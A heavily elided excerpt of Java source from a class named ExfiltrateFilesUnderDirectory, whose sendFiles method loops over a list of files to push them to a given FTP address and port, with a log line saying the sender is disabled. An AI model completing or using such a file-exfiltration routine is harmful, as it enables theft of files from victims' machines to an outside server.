...
public class ExfiltrateFilesUnderDirectory 
{
	...
	public static boolean sendFiles(ArrayList<File> alFilesToSend, String FTP_Address, int FTP_Port, PrintWriter pwOut, String FTP_SERVER_TYPE)
	{
		try
		{
			...
			try	{ steps = (100.0/(alFilesToSend.size()));} catch(Exception e){steps = -1;}
			...
			for(int i = 0; i < alFilesToSend.size(); i++)
			{
				try
				{
					...
					try	{	File_Transfer fileTransfer = new File_Transfer(File_Transfer.GET_FILE, fle.getCanonicalPath(), pwOut);	} catch(Exception e){}
					
					Driver.sop("Disabling FTP_Sender for now in " + strMyClassName);
